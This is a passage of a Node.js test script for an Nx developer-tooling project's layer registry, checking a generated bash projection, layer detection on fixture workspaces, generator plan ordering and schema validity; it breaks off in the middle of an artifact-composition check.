#!/usr/bin/env node
/**
 * Test the LAYER REGISTRY — and keep its shell projection honest.
 *
 *   node tools/test-layers/run.mjs           # check
 *   node tools/test-layers/run.mjs --write   # regenerate engine/layers.sh from the registry, then check
 *
 * ── WHY ────────────────────────────────────────────────────────────────────────────────────────────────
 *
 * The registry (nx-tools/src/layers/*.ts) is the single source of truth for what layers exist. Two readers
 * cannot load it — house.sh's outer shell, which validates the layers to add before anything is installed, and the
 * SessionStart hook, which must stay a few greps — so they read `engine/layers.sh`, a GENERATED projection.
 * A generated file that can drift is a second source of truth with extra steps; this is what stops it
 * drifting: the check regenerates the projection from the compiled registry and fails on any difference.
 *
 * It also pins the behaviour the projection and the planner promise, against fixture workspaces:
 *   - detection (incl. the regressions this effort fixed: tooling projects no longer read as `js`, HOUSE.md
 *     alone no longer reads as `agent`);
 *   - the plan (which generators run, in which order, with which arguments);
 *   - EVIDENCE PARITY: the bash evaluator inside layers.sh, run against the same fixture written to disk,
 *     never reports a layer the registry does not (it may under-report — that is its documented direction).
 *
 * Like the migration tests it compiles the payload the way the publisher does and tests the RESULT.
 * Needs `yarn install`.
 */
import { execFileSync, spawnSync } from 'node:child_process';
import { mkdirSync, rmSync, existsSync, readFileSync, readdirSync, writeFileSync, mkdtempSync, readlinkSync, lstatSync, symlinkSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { tmpdir } from 'node:os';
import { ASSETS, PAYLOAD, compilePayload, requireFromRepo, requireInstalled } from '../test-support/payload.mjs';

const PROJECTION = join(ASSETS, 'layers.sh');
const write = process.argv.includes('--write');

requireInstalled(
  [
    ['@nx/devkit', "the fixtures use @nx/devkit's in-memory Tree"],
    ['typescript', 'the payload is transpiled before it is tested'],
    ['nx', 'the CLI reads workspaces through Nx\'s own FsTree'],
  ],
  'Layer tests',
);

// The compiled payload, as the publisher builds it — see tools/test-support/payload.mjs for why it lands where it does.
const payload = compilePayload('bespunky-layer-tests');
const BUILD = payload.build;
const require_ = requireFromRepo;
const registry = require_(join(BUILD, 'src/layers/registry'));
const { plan } = require_(join(BUILD, 'src/layers/plan'));
const { shellProjection } = require_(join(BUILD, 'src/layers/cli'));
const { createTreeWithEmptyWorkspace } = require_('@nx/devkit/testing');
const { addProjectConfiguration, writeJson, readProjectConfiguration, updateProjectConfiguration } = require_('@nx/devkit');

let failed = 0;
let passed = 0;
const check = (name, fn) => {
  const problems = [];
  try {
    fn((cond, msg) => cond || problems.push(msg));
  } catch (error) {
    problems.push(`threw: ${error.stack || error.message}`);
  }
  if (problems.length) {
    failed++;
    console.log(`  FAIL ${name}`);
    for (const p of problems) console.log(`         ${p}`);
  } else {
    passed++;
    console.log(`  ok   ${name}`);
  }
};

// ── the projection ─────────────────────────────────────────────────────────────────────────────────────────
console.log('projection');
const projection = shellProjection();
if (write) writeFileSync(PROJECTION, projection);
check('engine/layers.sh matches the registry (regenerate: --write)', (ok) =>
  ok(existsSync(PROJECTION) && readFileSync(PROJECTION, 'utf8') === projection, 'layers.sh is stale or missing'),
);
check('engine/layers.sh parses and defines the registered ids', (ok) => {
  const out = execFileSync('bash', ['-c', `set -eu; . "$1"; printf '%s|%s|%s' "$HOUSE_LAYERS" "$HOUSE_LAYER_FLOOR" "$(house_layer_ensurable_new web)"`, '_', PROJECTION]).toString();
  ok(out === `${registry.LAYERS.map((l) => l.id).join(',')}|nx|via:angular`, `got ${out}`);
});

check('presets: projected verbatim, the default first-class, every one a set a scaffold can create', (ok) => {
  const { PRESETS, DEFAULT_PRESET } = require_(join(BUILD, 'src/layers/presets'));
  const out = execFileSync('bash', ['-c', `set -eu; . "$1"; printf '%s|%s' "$HOUSE_PRESETS" "$HOUSE_PRESET_DEFAULT"; for p in $(printf '%s' "$HOUSE_PRESETS" | tr , ' '); do printf '|%s=%s' "$p" "$(house_preset_layers "$p")"; done`, '_', PROJECTION]).toString();
  ok(out === `${PRESETS.map((p) => p.id).join(',')}|${DEFAULT_PRESET}${PRESETS.map((p) => `|${p.id}=${p.layers.join(',')}`).join('')}`, `got ${out}`);
  ok(DEFAULT_PRESET === 'agent', 'the default project is the stack-agnostic one');
  for (const p of PRESETS) {
    for (const id of p.layers) for (const r of registry.layer(id).requires) ok(p.layers.includes(r), `${p.id}: ${id} requires ${r}`);
  }
  ok(PRESETS.find((p) => p.id === 'agent').layers.join() === 'nx,agent', 'agent preset = nx,agent');
});
check('a scaffold knows how to bootstrap angular from the registry alone (nx plugin + app-creating stack)', (ok) => {
  const out = execFileSync('bash', ['-c', `set -eu; . "$1"; printf '%s|%s|%s' "$(house_layer_nx_plugin angular)" "$(house_layer_app_stack angular)" "$(house_layer_app_stack js)"`, '_', PROJECTION]).toString();
  ok(out === '@nx/angular|angular|', `got ${out}`);
});

// ── fixtures ───────────────────────────────────────────────────────────────────────────────────────────────
const tooling = (tree, name, extra = {}) =>
  addProjectConfiguration(tree, name, {
    root: `tools/${name}`,
    tags: ['tooling'],
    targets: { up: { executor: 'nx:run-commands', options: { command: 'true' } } },
    ...extra,
  });

const FIXTURES = {
  'bare nx workspace': () => createTreeWithEmptyWorkspace(),
  'legacy tooling projects declaring projectType library': () => {
    const tree = createTreeWithEmptyWorkspace();
    tooling(tree, 'shared-browser', { projectType: 'library' });
    tooling(tree, 'worktree-domains', { projectType: 'library' });
    return tree;
  },
  'HOUSE.md only (the floor stamp, no agent tooling)': () => {
    const tree = createTreeWithEmptyWorkspace();
    tree.delete('package.json'); // a wrapper-hosted repo — no package.json, so not a Node project
    tree.write('HOUSE.md', '# house\n');
    return tree;
  },
  'agent project with voice remembered': () => {
    const tree = createTreeWithEmptyWorkspace();
    tree.write('HOUSE.md', '# house\n');
    writeJson(tree, '.devcontainer/.bespunky-devcontainer.json', { owned: true, voice: true });
    return tree;
  },
  'angular web app with firebase and a design system': () => {
    const tree = createTreeWithEmptyWorkspace();
    writeJson(tree, 'package.json', { name: 'shop', devDependencies: { '@nx/angular': '23.1.0', '@nx/js': '23.1.0' } });
    writeJson(tree, '.devcontainer/.bespunky-devcontainer.json', { owned: true });
    tree.write('firebase.json', '{}');
    addProjectConfiguration(tree, 'shop', {
      root: 'apps/shop',
      projectType: 'application',
      targets: { build: { executor: '@angular/build:application' }, 'dev-server': { executor: '@angular/build:dev-server' } },
    });
    addProjectConfiguration(tree, 'design-system', { root: 'packages/design-system', projectType: 'library', tags: ['type:design-system'] });
    return tree;
  },
  'python repo with a hand-written dev declaration': () => {
    const tree = createTreeWithEmptyWorkspace();
    tree.delete('package.json');
    tree.write('HOUSE.md', '# house\n');
    writeJson(tree, '.devcontainer/.bespunky-devcontainer.json', { owned: true });
    writeJson(tree, '.bespunky/dev.json', {
      apps: { site: { processes: [{ id: 'app', cmd: 'python3 -m http.server ${PORT:app}', ports: { app: 8000 } }] } },
    });
    return tree;
  },
  // Phase 4 — capabilities on the Nx floor, no framework.
  'plain npm repo wearing firebase and a neutral design system': () => {
    const tree = createTreeWithEmptyWorkspace();
    writeJson(tree, 'package.json', { name: 'backend', devDependencies: { nx: '23.1.0' } });
    tree.write('firebase.json', '{}');
    addProjectConfiguration(tree, 'design-system', { root: 'packages/design-system', projectType: 'library', tags: ['type:design-system'] });
    return tree;
  },
  'navigation library found by its tag, under any name': () => {
    const tree = createTreeWithEmptyWorkspace();
    writeJson(tree, 'package.json', { name: 'shop', devDependencies: { '@nx/angular': '23.1.0' } });
    addProjectConfiguration(tree, 'routing-kernel', { root: 'libs/routing-kernel', projectType: 'library', tags: ['type:navigation'] });
    return tree;
  },
  'python site with its own dev-server target, no agent': () => {
    const tree = createTreeWithEmptyWorkspace();
    tree.delete('package.json');
    addProjectConfiguration(tree, 'site', {
      root: 'services/site',
      projectType: 'application',
      targets: { 'dev-server': { executor: 'nx:run-commands', options: { command: 'python3 -m http.server' } } },
    });
    return tree;
  },
  // A5 — a BACKEND is not a web app because it has a target called `serve`. @nx/js:node's `--port` is the
  // inspector's (its schema: "The port to inspect the process on", default 9229).
  'node API served by @nx/js:node on `serve`, and a python API on `serve`': () => {
    const tree = createTreeWithEmptyWorkspace();
    addProjectConfiguration(tree, 'api', {
      root: 'apps/api',
      projectType: 'application',
      targets: {
        build: { executor: '@nx/esbuild:esbuild' },
        serve: { executor: '@nx/js:node', options: { buildTarget: 'api:build' } },
      },
    });
    addProjectConfiguration(tree, 'pyapi', {
      root: 'services/pyapi',
      targets: { serve: { executor: 'nx:run-commands', options: { command: 'uvicorn app:api' } } },
    });
    return tree;
  },
  'a fresh Angular app whose dev-server still sits on `serve`': () => {
    const tree = createTreeWithEmptyWorkspace();
    writeJson(tree, 'package.json', { name: 'shop', devDependencies: { '@nx/angular': '23.1.0' } });
    addProjectConfiguration(tree, 'shop', {
      root: 'apps/shop',
      projectType: 'application',
      targets: { build: { executor: '@angular/build:application' }, serve: { executor: '@angular/build:dev-server' } },
    });
    return tree;
  },
};

const EXPECTED_DETECTION = {
  'bare nx workspace': 'nx,node',
  'legacy tooling projects declaring projectType library': 'nx,node',
  'HOUSE.md only (the floor stamp, no agent tooling)': 'nx',
  'agent project with voice remembered': 'nx,agent,node',
  'angular web app with firebase and a design system': 'nx,agent,node,js,web,angular,design-system,firebase',
  'python repo with a hand-written dev declaration': 'nx,agent,web',
  'python site with its own dev-server target, no agent': 'nx,web',
  'node API served by @nx/js:node on `serve`, and a python API on `serve`': 'nx,node,js',
  'a fresh Angular app whose dev-server still sits on `serve`': 'nx,node,web,angular',
  'plain npm repo wearing firebase and a neutral design system': 'nx,node,design-system,firebase',
  'navigation library found by its tag, under any name': 'nx,node,angular,navigation',
};

console.log('\ndetection');
for (const [name, make] of Object.entries(FIXTURES)) {
  check(name, (ok) => {
    const got = registry.detectLayers(make()).join(',');
    ok(got === EXPECTED_DETECTION[name], `detected ${got}, expected ${EXPECTED_DETECTION[name]}`);
  });
}

// ── evidence parity: the bash evaluator never claims more than the registry ───────────────────────────────
console.log('\nevidence parity (layers.sh evaluator vs the registry)');
const flush = (tree) => {
  const dir = mkdtempSync(join(tmpdir(), 'layers-'));
  const walk = (path) => {
    for (const child of tree.children(path)) {
      const full = path === '.' ? child : `${path}/${child}`;
      if (tree.isFile(full)) {
        mkdirSync(dirname(join(dir, full)), { recursive: true });
        writeFileSync(join(dir, full), tree.read(full));
      } else walk(full);
    }
  };
  walk('.');
  return dir;
};
for (const [name, make] of Object.entries(FIXTURES)) {
  check(name, (ok) => {
    const tree = make();
    const dir = flush(tree);
    try {
      const shell = execFileSync('bash', ['-c', '. "$1"; house_layers_evident "$2"', '_', PROJECTION, dir]).toString().trim();
      const exact = new Set(registry.detectLayers(tree));
      const extra = shell.split(',').filter((id) => id && !exact.has(id));
      ok(extra.length === 0, `the shell evaluator over-reports: ${extra.join(',')} (shell=${shell})`);
      // And it is not vacuous: on these fixtures every layer is visible to grep, so the two agree exactly.
      // (A layer known only through a `detect` refinement would legitimately be missing here.)
      ok(shell === [...exact].join(','), `the shell evaluator saw ${shell}, the registry ${[...exact].join(',')}`);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
}

// S4 — the shell walk reads the project.json files Nx reads: never a gitignored one, never another work tree's
// (`.claude/worktrees/*`, the house worktree home). It once did, and the hook reported a drifted layer the sync
// could never detect — every session.
check('evidence walk: gitignored and nested-worktree project.json files are invisible, exactly as to Nx', (ok) => {
  const { FsTree } = require_('nx/src/generators/tree');
  const served = JSON.stringify({ name: 'site', targets: { 'dev-server': { executor: 'nx:run-commands' } } });
  for (const git of [true, false]) {
    const dir = mkdtempSync(join(tmpdir(), 'layers-walk-'));
    try {
      writeFileSync(join(dir, 'nx.json'), '{}');
      writeFileSync(join(dir, '.gitignore'), '.claude/worktrees/\nscratch/\n');
      for (const sub of ['.claude/worktrees/feat/apps/site', 'scratch/site']) {
        mkdirSync(join(dir, sub), { recursive: true });
        writeFileSync(join(dir, sub, 'project.json'), served);
      }
      writeFileSync(join(dir, '.claude/worktrees/feat/.git'), 'gitdir: /elsewhere\n');
      if (git) execFileSync('git', ['init', '-q', dir]);
      const shell = execFileSync('bash', ['-c', '. "$1"; house_layers_evident "$2"', '_', PROJECTION, dir]).toString().trim();
      const label = git ? 'git work tree' : 'plain directory';
      const nx = registry.detectLayers(new FsTree(dir, false));
      // Inside git the walk IS Nx's view. Outside git it cannot read .gitignore (no git to ask) and prunes the
      // usual suspects instead — so it may only ever see LESS than Nx (the hook's quiet direction), never more.
      ok(shell.split(',').every((id) => !id || nx.includes(id)), `${label}: the walk over-reports (shell=${shell}, Nx=${nx})`);
      if (git) ok(shell === nx.join(',') && !shell.split(',').includes('web'), `${label}: shell=${shell}, Nx=${nx}`);
      // …and a project.json that IS part of the workspace is still seen.
      mkdirSync(join(dir, 'apps/site'), { recursive: true });
      writeFileSync(join(dir, 'apps/site/project.json'), served);
      const seen = execFileSync('bash', ['-c', '. "$1"; house_layers_evident "$2"', '_', PROJECTION, dir]).toString().trim();
      ok(seen.split(',').includes('web'), `${label}: a workspace project.json was missed (shell=${seen})`);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }
});

// ── the plan ───────────────────────────────────────────────────────────────────────────────────────────────
console.log('\nplan');
const STAMP = { nxToolsVersion: '9.9.9', pluginVersion: '1.0.0', packageManager: 'yarn' };
const ctxFor = (tree, overrides = {}) => {
  const detected = registry.detectLayers(tree);
  const ensured = overrides.ensured ?? [];
  // Registry order, as the CLI builds them (cli.ts `plan`).
  const ordered = (ids) => new Set(registry.inRegistryOrder(ids));
  return {
    tree,
    mode: 'upgrade',
    active: ordered([...detected, ...ensured]),
    ensured: new Set(ensured),
    detected: new Set(detected),
    project: 'shop',
    app: 'shop',
    voice: false,
    staging: false,
    ...overrides,
    ...(overrides.ensured ? { ensured: ordered(ensured), active: ordered([...detected, ...ensured]) } : {}),
  };
};
const render = (lines) =>
  lines.map((l) => (l.kind === 'gen' ? `${l.generator} ${l.args.join(' ')}`.trim() : l.kind === 'warn' ? 'WARN' : 'PARTIAL'));

check('bare repo, add-layer agent: the floor\'s gitignore, the agent trio, then the stamp — nothing else', (ok) => {
  const got = render(plan(ctxFor(FIXTURES['bare nx workspace'](), { ensured: ['nx', 'agent'] }), STAMP));
  const want = [
    'gitignore --layers=nx,agent,node',
    'devcontainer --name=shop --layers=nx,agent,node',
    'claude-settings --layers=nx,agent,node',
    'window-identity --name=shop',
    'house-doc --nxToolsVersion=9.9.9 --pluginVersion=1.0.0 --packageManager=yarn --layers=nx,agent,node',
  ];
  ok(JSON.stringify(got) === JSON.stringify(want), `got\n           ${got.join('\n           ')}`);
});
check('a plain sync on a bare repo runs only the floor (gitignore + the stamp; everything above it is opt-in)', (ok) => {
  const got = render(plan(ctxFor(FIXTURES['HOUSE.md only (the floor stamp, no agent tooling)']()), STAMP));
  ok(got.length === 2 && got[0] === 'gitignore --layers=nx' && got[1].startsWith('house-doc ') && got[1].endsWith('--layers=nx'), `got ${got.join(' | ')}`);
});
// The branch model a sync RESOLVED reaches house-doc as ONE argument, spaces and JSON intact — the rendered sequence
// reads the plan's TAB-separated fields into an array, so nothing is word-split; only control characters are refused.
check('house-doc receives the resolved branch projection as one argument; absent → not passed', (ok) => {
  const projection = JSON.stringify({ schema: 1, integration: 'dev', protected: ['dev', 'prod'], summary: 'dev → prod (two lines)' });
  const tree = () => FIXTURES['HOUSE.md only (the floor stamp, no agent tooling)']();
  const stampOf = (lines) => lines.find((l) => l.kind === 'gen' && l.generator === 'house-doc')?.args ?? [];
  const passed = stampOf(plan(ctxFor(tree()), { ...STAMP, branchProjection: projection }));
  ok(passed.includes(`--branchProjection=${projection}`), `got ${JSON.stringify(passed)}`);
  ok(stampOf(plan(ctxFor(tree()), { ...STAMP, branchProjection: 'undeclared' })).includes('--branchProjection=undeclared'), 'the undeclared literal');
  ok(!stampOf(plan(ctxFor(tree()), STAMP)).some((a) => a.startsWith('--branchProjection')), 'absent → house-doc reads the Tree');
  let refused = '';
  try { plan(ctxFor(tree()), { ...STAMP, branchProjection: 'a\tb' }); } catch (error) { refused = error.message; }
  ok(/unsafe argument/.test(refused), `a TAB inside an argument is refused: ${refused}`);
});
// THE ci LAYER — opt-in (no preset carries it), detected by its marker, last in the registry (it composes the deploy
// providers the layers before it contribute), and handed the SAME resolved branch model house-doc gets.
check('ci: opt-in, detected by its marker, runs last before the stamp with the resolved model; firebase is its provider', (ok) => {
  const { PRESETS } = require_(join(BUILD, 'src/layers/presets'));
  ok(PRESETS.every((p) => !p.layers.includes('ci')), 'no preset ensures ci');
  ok(registry.LAYERS.at(-1).id === 'ci', `ci is registered last (got ${registry.LAYERS.at(-1).id})`);
  ok(registry.layer('firebase').ciDeploy?.id === 'firebase', 'the firebase layer contributes the firebase deploy provider');
  const tree = FIXTURES['bare nx workspace']();
  ok(!registry.detectLayers(tree).includes('ci'), 'absent without its marker');
  tree.write('.bespunky/ci.json', '{"files":[],"cloud":{}}');
  ok(registry.detectLayers(tree).includes('ci'), 'present with its marker');
  const projection = JSON.stringify({ schema: 1, integration: 'main', summary: 'main (trunk)' });
  const got = render(plan(ctxFor(FIXTURES['bare nx workspace'](), { ensured: ['nx', 'ci'] }), { ...STAMP, branchProjection: projection }));
  ok(got.at(-2) === `ci --layers=nx,node,ci --branchProjection=${projection}`, `got ${got.at(-2)}`);
  ok(got.at(-1).startsWith('house-doc ') && got.at(-1).includes('--layers=nx,node,ci'), `stamp ${got.at(-1)}`);
  const standalone = render(plan(ctxFor(FIXTURES['bare nx workspace'](), { ensured: ['nx', 'ci'] }), STAMP));
  ok(standalone.includes('ci --layers=nx,node,ci'), 'no resolved model → the generator reads the Tree');
});
check('voice is carried forward from the devcontainer marker', (ok) => {
  const got = render(plan(ctxFor(FIXTURES['agent project with voice remembered']()), STAMP));
  const devcontainer = got.find((l) => l.startsWith('devcontainer ')) ?? '';
  ok(devcontainer.endsWith('--voice=true'), `got ${devcontainer}`);
});
check('full house sync: per-app steps first, then workspace steps in registry order, stamp last', (ok) => {
  const got = render(plan(ctxFor(FIXTURES['angular web app with firebase and a design system'](), { ensured: ['nx', 'firebase'], staging: true }), STAMP));
  const order = got.map((l) => l.split(' ')[0]);
  const want = ['serve', 'serve-options', 'worktree-tab-label', 'design-system-styles', 'firebase-client', 'gitignore', 'devcontainer', 'claude-settings', 'window-identity', 'playwright', 'port-claim', 'shared-browser', 'worktree-domains', 'dev', 'angular-ai', 'design-system', 'firebase-emulators', 'house-doc'];
  ok(JSON.stringify(order) === JSON.stringify(want), `order ${order.join(',')}`);
  ok(got.includes('serve --project=shop'), 'serve takes only the project');
  ok(got.includes('worktree-tab-label --project=shop --workspaceName=shop'), 'the tab label gets no --wireProviders on a detect-only angular');
  ok(got.includes('design-system --scope=shop'), 'design-system gets no --wireProviders on a detect-only sync');
  // Phase 4: the Firebase CLIENT attaches per app (through the app's stack adapter), the neutral CORE is a
  // workspace step that runs after it and follows the client app.
  ok(got.includes('firebase-client --project=shop --workspaceName=shop --staging=true --wireProviders'), 'firebase client args');
  // R5-3: seeding rules is a CREATION act. This workspace already has Firebase (detected), so ensuring it again
  // (`add-layer firebase` on it) must not seed: its emulators run open today, and deny-all would break them.
  ok(got.includes('firebase-emulators --workspaceName=shop --staging=true --clientApp=shop'), 'firebase core args');
  ok(!got.some((l) => l.startsWith('firebase-emulators ') && l.includes('--seedRules')), `a re-ensure of a detected layer seeds no rules: ${got.find((l) => l.startsWith('firebase-emulators '))}`);
  // An upgrade that merely DETECTS firebase never seeds either (the console may hold the live rules).
  const detected = render(plan(ctxFor(FIXTURES['angular web app with firebase and a design system'](), { ensured: ['nx'] }), STAMP));
  ok(detected.some((l) => l.startsWith('firebase-emulators ') && !l.includes('--seedRules')), `a detect-only sync seeds no rules: ${detected.find((l) => l.startsWith('firebase-emulators '))}`);
  // The run that CREATES it — ensured, not detected — seeds.
  const fresh = FIXTURES['angular web app with firebase and a design system']();
  fresh.delete('firebase.json');
  const created = render(plan(ctxFor(fresh, { ensured: ['nx', 'firebase'] }), STAMP));
  ok(created.some((l) => l.startsWith('firebase-emulators ') && l.includes('--seedRules')), `creating the layer seeds rules: ${created.find((l) => l.startsWith('firebase-emulators '))}`);
  const devcontainer = got.find((l) => l.startsWith('devcontainer ')) ?? '';
  ok(devcontainer.endsWith('--layers=nx,agent,node,js,web,angular,design-system,firebase'), `devcontainer layers: ${devcontainer}`);
});
check('new mode runs no per-app steps (the app generator composes them)', (ok) => {
  const got = render(plan(ctxFor(FIXTURES['angular web app with firebase and a design system'](), { mode: 'new' }), STAMP));
  ok(!got.some((l) => /^(serve|serve-options|firebase-client|design-system-styles) /.test(l)), `got ${got.join(' | ')}`);
});
check('web without agent: web generators skipped, reported, sync marked partial', (ok) => {
  const got = render(plan(ctxFor(FIXTURES['python site with its own dev-server target, no agent'](), { app: 'site' }), STAMP));
  ok(got[0] === 'WARN' && got[1] === 'PARTIAL', `got ${got.join(' | ')}`);
  ok(!got.some((l) => /^(serve|playwright|shared-browser) /.test(l)), 'no web generator ran');
});
// A1 — an UNMET layer is applied by nothing downstream. A wrapper repo (no package.json) ensuring firebase:
// firebase needs node, which a sync cannot create. Composing its devcontainer fragment shipped the JDK and the
// emulator ports for a layer that was never wired, and the stamp claimed it was applied.
check('unmet layer (firebase without node, wrapper repo): not composed, not stamped; the hint is one this mode accepts', (ok) => {
  const tree = FIXTURES['HOUSE.md only (the floor stamp, no agent tooling)']();
  const lines = plan(ctxFor(tree, { ensured: ['nx', 'agent', 'firebase'] }), STAMP);
  const got = render(lines);
  for (const step of ['gitignore', 'devcontainer', 'claude-settings', 'house-doc']) {
    const line = got.find((l) => l.startsWith(`${step} `)) ?? '';
    ok(/--layers=nx,agent( |$)/.test(line), `${step} carries a layer the plan skipped: ${line}`);
  }
  ok(!got.some((l) => l.startsWith('firebase-')), `firebase generators ran: ${got.join(' | ')}`);
  ok(got.includes('PARTIAL'), 'an unmet layer is a partial sync');
  const warning = lines.find((l) => l.kind === 'warn')?.message ?? '';
  ok(!warning.includes('add-layer node'), `the hint advises an add-layer the upgrade refuses: ${warning}`);
  ok(warning.includes(registry.layer('node').ensureHint), `the hint is node's own: ${warning}`);
});
check('a skipped requirement takes its dependants down with it (navigation over an unmet angular)', (ok) => {
  const tree = FIXTURES['navigation library found by its tag, under any name']();
  const got = render(plan(ctxFor(tree, { active: new Set(['nx', 'angular', 'navigation']), app: 'routing-kernel' }), STAMP));
  const stamp = got.find((l) => l.startsWith('house-doc ')) ?? '';
  ok(stamp.endsWith('--layers=nx'), `stamped a layer over a skipped requirement: ${stamp}`);
  ok(got.filter((l) => l === 'PARTIAL').length === 2, `both skips reported: ${got.join(' | ')}`);
});
// A2 — the layers' .gitignore blocks are the floor's step, not the agent layer's.
check('an Nx node app without the agent layer still gets every applied layer\'s gitignore', (ok) => {
  const tree = FIXTURES['plain npm repo wearing firebase and a neutral design system']();
  const got = render(plan(ctxFor(tree, { app: 'backend' }), STAMP));
  ok(got.includes('gitignore --layers=nx,node,design-system,firebase'), `got ${got.join(' | ')}`);
  ok(!got.some((l) => l.startsWith('claude-settings ')), 'no agent step on a repo without agent');
});
check('app missing: per-app steps skipped and reported partial, workspace steps still run', (ok) => {
  const got = render(plan(ctxFor(FIXTURES['angular web app with firebase and a design system'](), { app: 'nope' }), STAMP));
  ok(got.filter((l) => l === 'PARTIAL').length === 3, `got ${got.join(' | ')}`);
  ok(got.includes('playwright'), 'workspace web steps still run');
});
check('declaration-only web (no Nx-served app): per-app Nx steps skipped quietly, the engine still written', (ok) => {
  const got = render(plan(ctxFor(FIXTURES['python repo with a hand-written dev declaration'](), { app: 'pyrepo' }), STAMP));
  ok(!got.includes('PARTIAL'), `a declaration-only project is not a partial sync: ${got.join(' | ')}`);
  ok(!got.some((l) => /^(serve|serve-options|playwright) /.test(l) || l === 'playwright'), `no Nx/JS step: ${got.join(' | ')}`);
  for (const step of ['port-claim', 'shared-browser', 'worktree-domains', 'dev']) ok(got.includes(step), `${step} runs`);
});
// `nx init` on a package.json makes the repo ROOT a project. It EXISTS, so the per-app steps once ran on it — and
// the serve generator refuses a project with nothing to serve, killing the sync of a plain npm repo that declares
// what it serves in .bespunky/dev.json. Existing is not being Nx-served.
check('declaration-only web on a package.json repo: the root project serves nothing, so no per-app serve steps', (ok) => {
  const tree = FIXTURES['python repo with a hand-written dev declaration']();
  writeJson(tree, 'package.json', { name: 'npmrepo', nx: {} });
  addProjectConfiguration(tree, 'npmrepo', { root: '.', targets: { build: { executor: 'nx:run-commands', options: { command: 'true' } } } });
  const got = render(plan(ctxFor(tree, { app: 'npmrepo' }), STAMP));
  ok(!got.some((l) => /^serve(-options)? /.test(l)), `serve planned on a project with nothing to serve: ${got.join(' | ')}`);
  ok(!got.includes('PARTIAL'), `not a partial sync: ${got.join(' | ')}`);
});
check('firebase and the design system on the Nx floor alone: core steps run, nothing partial', (ok) => {
  const got = render(plan(ctxFor(FIXTURES['plain npm repo wearing firebase and a neutral design system'](), { app: 'backend' }), STAMP));
  ok(!got.includes('PARTIAL'), `a backend-only Firebase is a legitimate shape, not a partial sync: ${got.join(' | ')}`);
  ok(!got.some((l) => l.startsWith('firebase-client ')), 'no client attached — there is no app');
  ok(got.includes('firebase-emulators --workspaceName=shop'), `core without a client app: ${got.join(' | ')}`);
  ok(got.includes('design-system --scope=shop'), 'the design-system core runs without a framework');
  // Every emulator suite claims its ports through the dev engine (tools/dev/lib/stacks.mjs) — with or without `web`.
  ok(got.includes('dev') && got.indexOf('dev') > got.indexOf('firebase-emulators --workspaceName=shop'), `the dev engine is written for a backend-only Firebase too: ${got.join(' | ')}`);
});
check('firebase with apps the client could go into, but the named app missing: partial', (ok) => {
  const got = render(plan(ctxFor(FIXTURES['angular web app with firebase and a design system'](), { app: 'nope' }), STAMP));
  ok(got.includes('firebase-emulators --workspaceName=shop'), `the core still runs: ${got.join(' | ')}`);
});
check('an unknown layer id is refused, not ignored', (ok) => {
  let threw = false;
  try {
    registry.layer('reactt');
  } catch {
    threw = true;
  }
  ok(threw, 'layer("reactt") did not throw');
});

// ── option schemas: what Nx's own validator accepts ─────────────────────────────────────────────────────────
// Nx validates every `nx <target> --flag` against the executor's schema.json BEFORE the executor runs, and it
// rejects a union type that includes `array` ("Property 'skip' does not match the schema") — so
// `nx serve <app> --skip=emulators` failed outright while every unit test of the executor passed. Nx parses a
// comma list or a repeated flag into an array itself; an option that takes several values is `"type": "array"`.
console.log('\noption schemas');
check('no schema property declares a union type containing array/object (Nx rejects it at the CLI)', (ok) => {
  const walk = (dir) =>
    readdirSync(dir, { withFileTypes: true }).flatMap((e) => (e.isDirectory() ? walk(join(dir, e.name)) : e.name === 'schema.json' ? [join(dir, e.name)] : []));
  for (const file of walk(join(PAYLOAD, 'src'))) {
    for (const [key, prop] of Object.entries(JSON.parse(readFileSync(file, 'utf8')).properties ?? {})) {
      ok(!(Array.isArray(prop.type) && prop.type.some((t) => t === 'array' || t === 'object')), `${file.slice(PAYLOAD.length + 1)}: ${key} is ${JSON.stringify(prop.type)}`);
    }
  }
});

// ── agent artifacts: the devcontainer, the Claude settings and the house docs, COMPOSED from the layers ───────
// The generators run for real (compiled, on a virtual tree) for the shapes the stack-agnostic effort exists for:
// a repo with no package.json must get no Node/web/Angular artifacts, and the full house shape must keep them.
console.log('\nagent artifacts (composed from the layers)');
const { parse: parseJsonc } = require_('jsonc-parser');
const generator = (name) => require_(join(BUILD, `src/generators/${name}/generator`)).default;
const artifacts = async (tree, layers, extra = {}) => {
  // The project's Node major is its .nvmrc (_utils/node-version) — these fixtures declare 22.
  if (!tree.exists('.nvmrc')) tree.write('.nvmrc', '22\n');
  await generator('devcontainer')(tree, { name: 'shop', layers, ...extra });
  await generator('claude-settings')(tree, { layers });
  await generator('gitignore')(tree, { layers });
  await generator('house-doc')(tree, { layers, nxToolsVersion: '9.9.9', pluginVersion: '1.0.0', ...(extra.packageManager ? { packageManager: extra.packageManager } : {}) });
  const read = (path) => tree.read(path, 'utf8') ?? '';
  return {
    dc: parseJsonc(read('.devcontainer/devcontainer.json')),
    dcText: read('.devcontainer/devcontainer.json'),
    post: read('.devcontainer/post-create.sh'),
    dockerfile: read('.devcontainer/house.Dockerfile'),
    osScript: read('.devcontainer/house.packages.sh'),
    osList: read('.devcontainer/os-packages.txt'),
    settings: JSON.parse(read('.claude/settings.json')),
    gitignore: read('.gitignore'),
    house: read('HOUSE.md'),
    rules: read('HOUSE.rules.md'),
    claude: read('CLAUDE.md'),
  };
};
const bashParses = (script) => {
  try {
    execFileSync('bash', ['-n'], { input: script });
    return true;
  } catch {
    return false;
  }
};
const wrapperRepo = () => {
  const tree = createTreeWithEmptyWorkspace();
  tree.delete('package.json');
  writeJson(tree, 'nx.json', { installation: { version: '23.2.1', plugins: { '@bespunky/nx-tools': '9.9.9' } } });
  tree.write('.nx/nxw.js', '// wrapper\n');
  tree.write('main.py', 'print("hi")\n');
  return tree;
};
const pending = [];
const checkAsync = (name, fn) =>
  pending.push(async () => {
    const problems = [];
    try {
      await fn((cond, msg) => cond || problems.push(msg));
    } catch (error) {
      problems.push(`threw: ${error.stack || error.message}`);
    }
    if (problems.length) {
      failed++;
      console.log(`  FAIL ${name}`);
      for (const p of problems) console.log(`         ${p}`);
    } else {
      passed++;
      console.log(`  ok   ${name}`);
    }
  });

checkAsync('wrapper-hosted repo (no package.json), nx+agent: neutral base, Node as a feature, nothing Node/web/Angular', async (ok) => {
  const a = await artifacts(wrapperRepo(), ['nx', 'agent']);
  ok(!('image' in a.dc) && a.dc.build?.dockerfile === 'house.Dockerfile' && a.dc.build?.context === '.', `build ${JSON.stringify(a.dc.build)}`);
